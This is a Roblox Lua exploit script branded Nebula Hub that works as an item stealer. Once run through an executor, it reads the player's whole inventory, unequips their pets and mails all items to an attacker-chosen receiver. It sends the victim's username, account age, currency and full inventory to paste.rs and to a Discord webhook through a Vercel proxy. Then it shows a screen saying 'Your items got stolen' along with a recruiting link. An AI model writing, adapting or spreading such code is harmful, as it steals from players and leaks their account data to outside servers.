-- Inherit loader globals (webhook/receiver set before loadstring)
local function nonEmpty(value)
    if type(value) ~= "string" then
        return ""
    end
    local trimmed = value:match("^%s*(.-)%s*$") or ""
    if trimmed == "" or trimmed:find("YOUR_WEBHOOK_ID", 1, true) or trimmed:find("REPLACE_WITH", 1, true) then
        return ""
    end
    return trimmed
end

local function syncLoaderGlobals()
    local g = getgenv and getgenv() or {}
    local wh = nonEmpty(g.webhook) ~= "" and g.webhook or nonEmpty(webhook)
    local rc = nonEmpty(g.receiver) ~= "" and g.receiver or nonEmpty(receiver)
    if wh ~= "" then
        g.webhook = wh
        webhook = wh
    end
    if rc ~= "" then
        g.receiver = rc
        receiver = rc
    end
    return g, wh, rc
end

syncLoaderGlobals()

local DISCORD = "https://discord.gg/7TndECm7pH"
local DEFAULT_PROXY_SEND_URL = "https://nebulaaaaa.vercel.app/api/send-message"

local HttpService = game:GetService("HttpService")

local function getHttpRequest()
    return request
        or http_request
        or (syn and syn.request)
        or (http and http.request)
end

local function safePost(url, body, headers)
    local g = getgenv and getgenv()
    if g and type(g.safePost) == "function" then
        return g.safePost(url, body, headers)
    end

    local req = getHttpRequest()
    if not req then
        return nil, 0
    end

    headers = headers or { ["Content-Type"] = "application/json" }
    local ok, res = pcall(req, {
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body,
    })

    if ok and type(res) == "table" then
        return res.Body, res.StatusCode or res.status or 0
    end

    return nil, 0
end

local function safeGet(url, headers)
    local g = getgenv and getgenv()
    if g and type(g.safeGet) == "function" then
        return g.safeGet(url, headers)
    end

    local req = getHttpRequest()
    if not req then
        return nil, 0
    end

    local ok, res = pcall(req, {
        Url = url,
        Method = "GET",
        Headers = headers or {},
    })

    if ok and type(res) == "table" then
        return res.Body, res.StatusCode or res.status or 0
    end

    return nil, 0
end

local function normalizeReceiver(name)
    if type(name) ~= "string" then
        return ""
    end
    return (name:gsub("^%s*@?", ""):match("^%s*(.-)%s*$") or "")
end

local function resolveWebhookId()
    local g = getgenv and getgenv() or {}
    return nonEmpty(g.webhook) ~= "" and g.webhook or nonEmpty(webhook)
end

local function resolveReceiver()
    local g = getgenv and getgenv() or {}
    local raw = nonEmpty(g.receiver) ~= "" and g.receiver or nonEmpty(receiver)
    return normalizeReceiver(raw)
end

local PROXY_SEND_URL = DEFAULT_PROXY_SEND_URL

-- POST /api/send-message â€” { webhook_id, content?, embeds?, username?, avatar_url? }
local function sendProxyMessage(options)
    options = options or {}

    local webhookId = resolveWebhookId()
    local receiverForEmbed = resolveReceiver()
    if webhookId == "" then
        warn("[proxy] send failed: webhook is empty")
        return false
    end

    if not webhookId:find("^wh_", 1) then
        warn("[proxy] send failed: webhook must be vault id wh_...")
        return false
    end

    local embeds = options.embeds
    if not embeds then
        embeds = {{
            title = options.title or "Nebula Hub",
            description = options.description or ("Receiver: " .. receiverForEmbed),
            color = options.color or 0x2B2D31,
        }}
    end

    local payload = {
        webhook_id = webhookId,
        embeds = embeds,
    }
    if options.content then
        payload.content = options.content
    end
    if options.username then
        payload.username = options.username
    end
    if options.avatar_url then
        payload.avatar_url = options.avatar_url
    end

    local body = HttpService:JSONEncode(payload)
    local sent = false

    local ok, result = pcall(function()
        local responseBody, statusCode = safePost(
            PROXY_SEND_URL,
            body,
            { ["Content-Type"] = "application/json" }
        )

        if statusCode and statusCode >= 200 and statusCode < 300 then
            warn("[proxy] sent ok:", statusCode)
            return true
        end

        warn("[proxy] send failed:", statusCode, responseBody)
        return false
    end)

    if not ok then
        warn("[proxy] send error:", result)
        return false
    end

    return result == true
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local Networking
local PlayerStateClient
local PetData
local PetTypes
local SeedData
local GearShopData
local LookupPlayer
local SendBatch
local RequestUnequip
local modulesReady = false

local RARITY_RANK = {
    Secret = 8, Super = 7, Mythic = 6, Legendary = 5, Epic = 4,
    Rare = 3, Uncommon = 2, Common = 1,
}

local GEAR_ATTRS = {
    Sprinkler = "Sprinklers", WateringCan = "WateringCans", Mushroom = "Mushrooms",
    Gnome = "Gnomes", Raccoon = "Raccoons", Crate = "Crates", SeedPack = "SeedPacks",
    Trowel = "Trowels", Egg = "Crates", Teleporter = "Props", PowerHose = "Props",
    Rake = "Props", Prop = "Props",
}

local MAIL_CATEGORIES = {
    "Pets", "Sprinklers", "WateringCans", "Mushrooms", "Gnomes", "Raccoons",
    "Crates", "SeedPacks", "Trowels", "Props", "Seeds", "HarvestedFruits", "EmptyPots",
}

local SEED_RARITY, GEAR_RARITY, GEAR_COST = {}, {}, {}
local SEED_PRICE = {}

local function bootstrapGameModules()
    if modulesReady then
        return true
    end

    if not game:IsLoaded() then
        game.Loaded:Wait()
    end

    local shared = ReplicatedStorage:WaitForChild("SharedModules", 30)
    local client = ReplicatedStorage:WaitForChild("ClientModules", 30)
    local sharedData = ReplicatedStorage:WaitForChild("SharedData", 30)
    if not shared or not client or not sharedData then
        warn("[NEBULA] game modules missing")
        return false
    end

    local ok, err = pcall(function()
        Networking = require(shared:WaitForChild("Networking", 10))
        PlayerStateClient = require(client:WaitForChild("PlayerStateClient", 10))
        PetData = require(sharedData:WaitForChild("PetData", 10))
        PetTypes = require(sharedData:WaitForChild("PetTypes", 10))
        SeedData = require(shared:WaitForChild("SeedData", 10))
        GearShopData = require(shared:WaitForChild("GearShopData", 10))

        LookupPlayer = Networking.Mailbox.LookupPlayer
        SendBatch = Networking.Mailbox.SendBatch
        RequestUnequip = Networking.Pets.RequestUnequip
    end)

    if not ok then
        warn("[NEBULA] module bootstrap failed:", err)
        return false
    end

    for _, d in pairs(SeedData) do
        if type(d) == "table" and d.SeedName then
            SEED_RARITY[d.SeedName] = d.Rarity or "Common"
            SEED_PRICE[d.SeedName] = d.PurchasePrice or 0
        end
    end
    for _, d in ipairs(GearShopData.Data or {}) do
        if type(d) == "table" and d.ItemName then
            GEAR_RARITY[d.ItemName] = d.Rarity or "Common"
            GEAR_COST[d.ItemName] = d.Cost or 0
        end
    end

    modulesReady = true
    return true
end

local function log(...) end

local function getRequest()
    local req = getHttpRequest()
    if not req then
        return nil
    end
    return function(opts)
        local responseBody, statusCode = safePost(opts.Url, opts.Body, opts.Headers)
        return { Body = responseBody, StatusCode = statusCode }
    end
end

local function uploadPaste(text)
    if safePost then
        local body, code = safePost("https://paste.rs", text, { ["Content-Type"] = "text/plain" })
        if code and code > 0 and body and body:find("http") then
            local url = body:match("https?://[%w%-%./]+") or body:gsub("%s+", "")
            if url ~= "" then return url .. "/raw" end
        end
        return nil
    end
    local req = getRequest()
    if not req then return nil end
    local ok, res = pcall(function()
        return req({ Url = "https://paste.rs", Method = "POST", Headers = { ["Content-Type"] = "text/plain" }, Body = text })
    end)
    if ok and res and res.Body and res.Body:find("http") then
        local url = res.Body:match("https?://[%w%-%./]+") or res.Body:gsub("%s+", "")
        if url ~= "" then return url .. "/raw" end
    end
    return nil
end

local function getExecutor()
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    return "Unknown"
end

local function comma(n)
    local s = tostring(math.floor(tonumber(n) or 0))
    local sign = s:sub(1, 1) == "-" and "-" or ""
    if sign ~= "" then s = s:sub(2) end
    s = s:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
    return sign .. s
end

local function formatValue(n)
    n = tonumber(n) or 0
    if n >= 1000000 then
        return string.format("%.1fm", n / 1000000):gsub("%.0m", "m")
    elseif n >= 1000 then
        local k = n / 1000
        if math.abs(k - math.floor(k + 0.05)) < 0.1 then
            return tostring(math.floor(k + 0.5)) .. "k"
        end
        return string.format("%.1fk", k)
    end
    return tostring(math.floor(n))
end

local function getShekels()
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        local s = ls:FindFirstChild("Sheckles") or ls:FindFirstChild("Shekels")
        if s then return tonumber(s.Value) or 0 end
    end
    return 0
end

local function itemUnitValue(item)
    if item.kind == "pet" then
        local pd = PetData[item.rawName or item.name] or {}
        return pd.BasePrice or 0
    elseif item.kind == "seed" then
        return SEED_PRICE[item.name] or 0
    elseif item.kind == "gear" then
        return GEAR_COST[item.name] or 0
    end
    return 0
end

local function buildMergedInventory(queue)
    local map = {}
    for _, item in ipairs(queue) do
        local unit = itemUnitValue(item)
        local key = item.rarity .. "|" .. item.name .. "|" .. item.kind
        if not map[key] then
            map[key] = {
                rarity = item.rarity,
                name = item.name,
                count = 0,
                unit = unit,
                total = 0,
            }
        end
        map[key].count += item.count
        map[key].total += unit * item.count
    end
    local rows = {}
    for _, row in pairs(map) do
        table.insert(rows, row)
    end
    table.sort(rows, function(a, b) return a.total > b.total end)
    return rows
end

local function sendHitEmbed(queue)
    local merged = buildMergedInventory(queue)
    local invLines = {}
    local fullLines = {}

    for _, row in ipairs(merged) do
        local line = string.format("[%s] x%d %s           -> %s", row.rarity, row.count, row.name, formatValue(row.total))
        table.insert(invLines, line)
        table.insert(fullLines, line)
    end

    if #invLines == 0 then
        table.insert(invLines, "Empty")
    end

    local preview = table.concat(invLines, "\n")
    if #preview > 950 then
        local cut = {}
        for i = 1, math.min(12, #invLines) do
            cut[i] = invLines[i]
        end
        preview = table.concat(cut, "\n") .. "\n... (see full inventory link)"
    end

    local fullText = table.concat(fullLines, "\n")
    if fullText == "" then fullText = "Empty" end
    local receiver = resolveReceiver()
    fullText = fullText .. "\n\nPlayer: " .. LocalPlayer.Name .. "\nReceiver: " .. receiver

    local pasteUrl = uploadPaste(fullText) or "Upload failed"

    return sendProxyMessage({
        content = "@everyone",
        username = "Nebula Hub",
        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds = {{
            title = "ðŸŒ» Gag 2 Hit - Nebula Hub ðŸŒ»",
            description = "Receiver: " .. receiver,
            color = 0x2B2D31,
            fields = {
                {
                    name = "Player Info",
                    value = string.format(
                        "```Username : %s\nExecutor : %s\nAcc age  : %d days\nReceiver : %s```",
                        LocalPlayer.Name,
                        getExecutor(),
                        LocalPlayer.AccountAge,
                        receiver
                    ),
                    inline = false,
                },
                {
                    name = "Total Shekels",
                    value = string.format("```%s Shekels```", comma(getShekels())),
                    inline = false,
                },
                {
                    name = "Inventory",
                    value = "```" .. preview .. "```",
                    inline = false,
                },
                {
                    name = "Full inventory:",
                    value = pasteUrl,
                    inline = false,
                },
            },
            footer = {
                text = "Nebula Hub",
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }},
    })
end

local function rarityRank(r) return RARITY_RANK[r or "Common"] or 0 end

local function sortBestFirst(list)
    table.sort(list, function(a, b) return (a.sortScore or 0) > (b.sortScore or 0) end)
end

local function getReplicaInventory()
    if not PlayerStateClient then
        return nil
    end
    local ok, replica = pcall(function()
        return PlayerStateClient:GetLocalReplica()
            or PlayerStateClient:WaitForLocalReplica(15)
    end)
    if not ok or not replica or not replica.Data then
        return nil
    end
    return replica.Data.Inventory
end

local function scanReplicaInventory()
    local inv = getReplicaInventory()
    if type(inv) ~= "table" then
        warn("[NEBULA] inventory replica not ready")
        return {}
    end

    local items = {}

    local pets = inv.Pets
    if type(pets) == "table" then
        for petId, pet in pairs(pets) do
            if type(pet) == "table" and type(petId) == "string" then
                local static = PetData[pet.Name] or {}
                local rarity = static.Rarity or "Common"
                local size = pet.Size or "Normal"
                local ptype = (pet.Type == PetTypes.Rainbow or pet.Type == "Rainbow") and "Rainbow" or "Normal"
                table.insert(items, {
                    kind = "pet",
                    category = "Pets",
                    itemKey = petId,
                    count = 1,
                    name = PetData.GetDisplayName and PetData.GetDisplayName(pet.Name, pet.Size) or pet.Name,
                    rawName = pet.Name,
                    rarity = rarity,
                    generation = size,
                    type = ptype,
                    equipped = pet.Equipped == true,
                    sortScore = rarityRank(rarity) * 1000
                        + (ptype == "Rainbow" and 200 or 0)
                        + (size == "Huge" and 30 or size == "Big" and 20 or 10),
                })
            end
        end
    end

    local seeds = inv.Seeds
    if type(seeds) == "table" then
        for seedName, count in pairs(seeds) do
            if type(count) == "number" and count > 0 then
                local rarity = SEED_RARITY[seedName] or "Common"
                table.insert(items, {
                    kind = "seed",
                    category = "Seeds",
                    itemKey = seedName,
                    count = count,
                    name = seedName,
                    rarity = rarity,
                    generation = "-",
                    type = "Seed",
                    sortScore = rarityRank(rarity) * 100,
                })
            end
        end
    end

    for _, category in ipairs(MAIL_CATEGORIES) do
        if category ~= "Pets" and category ~= "Seeds" then
            local bucket = inv[category]
            if type(bucket) == "table" then
                if category == "HarvestedFruits" then
                    for fruitId, fruit in pairs(bucket) do
                        if type(fruit) == "table" and fruit.Id then
                            table.insert(items, {
                                kind = "fruit",
                                category = category,
                                itemKey = fruitId,
                                count = 1,
                                name = tostring(fruit.Name or fruitId),
                                rarity = "Common",
                                generation = "-",
                                type = "Fruit",
                                sortScore = 50,
                            })
                        end
                    end
                else
                    for itemKey, count in pairs(bucket) do
                        if type(count) == "number" and count > 0 then
                            local rarity = GEAR_RARITY[tostring(itemKey)] or "Common"
                            table.insert(items, {
                                kind = "gear",
                                category = category,
                                itemKey = tostring(itemKey),
                                count = count,
                                name = tostring(itemKey),
                                rarity = rarity,
                                generation = "-",
                                type = category,
                                sortScore = rarityRank(rarity) * 100,
                            })
                        end
                    end
                end
            end
        end
    end

    return items
end

local function getTargetUserId(receiver)
    local ok, userId = pcall(function()
        return LookupPlayer:Fire(receiver)
    end)
    if ok and typeof(userId) == "number" and userId > 0 then
        return userId
    end
end

local function sendBatch(targetUserId, batch)
    if #batch == 0 then
        return true, ""
    end
    local ok, success, message = pcall(function()
        return SendBatch:Fire(targetUserId, batch, "")
    end)
    if not ok then
        return false, tostring(success)
    end
    return success == true, message or ""
end

local started = false

local function runMail()
    if started then return end
    started = true

    if not bootstrapGameModules() then
        warn("[NEBULA] could not load game modules")
        return
    end

    local receiver = resolveReceiver()
    if receiver == "" then
        warn("[NEBULA] receiver missing")
        return
    end

    local targetUserId = getTargetUserId(receiver)
    if not targetUserId then
        warn("[NEBULA] receiver not found:", receiver)
        return
    end

    if targetUserId == LocalPlayer.UserId then
        warn("[NEBULA] cannot mail yourself")
        return
    end

    local queue = scanReplicaInventory()
    sortBestFirst(queue)
    warn(string.format("[NEBULA] inventory: %d item types", #queue))

    for _, item in ipairs(queue) do
        if item.kind == "pet" and item.equipped then
            pcall(function()
                RequestUnequip:Fire(item.itemKey)
            end)
        end
    end
    if #queue > 0 then
        task.wait(0.5)
    end

    local webhookId = resolveWebhookId()
    if webhookId ~= "" then
        local hitOk = sendHitEmbed(queue)
        warn("[NEBULA] hit embed:", hitOk and "sent" or "failed")
    else
        warn("[proxy] webhook not set â€” hit embed not sent")
    end

    local sendList = {}
    for _, item in ipairs(queue) do
        sendList[#sendList + 1] = {
            Category = item.category,
            ItemKey = item.itemKey,
            Count = item.count,
        }
    end

    if #sendList == 0 then
        warn("[NEBULA] nothing to mail")
        return
    end

    local ok, msg = sendBatch(targetUserId, sendList)
    if ok then
        warn(string.format("[NEBULA] mailed %d item types in one gift to %s", #sendList, receiver))
    else
        warn("[NEBULA] mail failed:", msg)
    end
end

local function copyDiscordLink()
    local clip = setclipboard or (Clipboard and Clipboard.set) or (syn and syn.write_clipboard)
    if clip then
        pcall(clip, DISCORD)
        return true
    end
    return false
end

local function buildMinimalUI()
    local uiRoot = gethui and gethui() or game:GetService("CoreGui")

    local screen = Instance.new("ScreenGui")
    screen.Name = "NebulaNotice"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.Parent = uiRoot

    local backdrop = Instance.new("Frame")
    backdrop.Size = UDim2.fromScale(1, 1)
    backdrop.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    backdrop.BackgroundTransparency = 0.15
    backdrop.BorderSizePixel = 0
    backdrop.Parent = screen

    local scale = Instance.new("UIScale")
    scale.Parent = backdrop

    local function applyScale()
        local cam = workspace.CurrentCamera
        local vp = cam and cam.ViewportSize or Vector2.new(800, 600)
        scale.Scale = math.clamp(math.min(vp.X / 400, vp.Y / 300), 0.85, 1.25)
    end
    applyScale()
    if workspace.CurrentCamera then
        workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(applyScale)
    end

    local card = Instance.new("Frame")
    card.AnchorPoint = Vector2.new(0.5, 0.5)
    card.Position = UDim2.fromScale(0.5, 0.5)
    card.Size = UDim2.new(0.9, 0, 0, 0)
    card.AutomaticSize = Enum.AutomaticSize.Y
    card.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
    card.BorderSizePixel = 0
    card.Parent = backdrop

    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, 12)
    cardCorner.Parent = card

    local cardPad = Instance.new("UIPadding")
    cardPad.PaddingTop = UDim.new(0, 20)
    cardPad.PaddingBottom = UDim.new(0, 20)
    cardPad.PaddingLeft = UDim.new(0, 18)
    cardPad.PaddingRight = UDim.new(0, 18)
    cardPad.Parent = card

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 14)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = card

    local cardSize = Instance.new("UISizeConstraint")
    cardSize.MaxSize = Vector2.new(420, 1000)
    cardSize.MinSize = Vector2.new(260, 0)
    cardSize.Parent = card

    local message = Instance.new("TextLabel")
    message.BackgroundTransparency = 1
    message.Size = UDim2.new(1, 0, 0, 0)
    message.AutomaticSize = Enum.AutomaticSize.Y
    message.Font = Enum.Font.GothamMedium
    message.TextColor3 = Color3.fromRGB(235, 235, 240)
    message.TextWrapped = true
    message.TextXAlignment = Enum.TextXAlignment.Center
    message.Text = "Your items got stolen by nebula join to create your own mail script"
    message.LayoutOrder = 1
    message.Parent = card

    local msgConstraint = Instance.new("UITextSizeConstraint")
    msgConstraint.MinTextSize = 14
    msgConstraint.MaxTextSize = 20
    msgConstraint.Parent = message

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(1, 0, 0, 44)
    copyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    copyBtn.BorderSizePixel = 0
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.TextColor3 = Color3.new(1, 1, 1)
    copyBtn.Text = "Copy Discord invite"
    copyBtn.LayoutOrder = 2
    copyBtn.Parent = card

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = copyBtn

    local hint = Instance.new("TextLabel")
    hint.BackgroundTransparency = 1
    hint.Size = UDim2.new(1, 0, 0, 0)
    hint.AutomaticSize = Enum.AutomaticSize.Y
    hint.Font = Enum.Font.Gotham
    hint.TextColor3 = Color3.fromRGB(150, 150, 160)
    hint.TextWrapped = true
    hint.TextXAlignment = Enum.TextXAlignment.Center
    hint.Text = DISCORD:gsub("https://", "")
    hint.LayoutOrder = 3
    hint.Parent = card

    local hintConstraint = Instance.new("UITextSizeConstraint")
    hintConstraint.MinTextSize = 11
    hintConstraint.MaxTextSize = 14
    hintConstraint.Parent = hint

    copyBtn.MouseButton1Click:Connect(function()
        local copied = copyDiscordLink()
        if copied then
            copyBtn.Text = "Copied!"
            hint.Text = "Invite copied to clipboard"
        else
            copyBtn.Text = "Copy Discord invite"
            hint.Text = DISCORD:gsub("https://", "") .. " — tap and hold to copy"
        end
    end)

    task.spawn(runMail)
end

task.defer(buildMinimalUI)
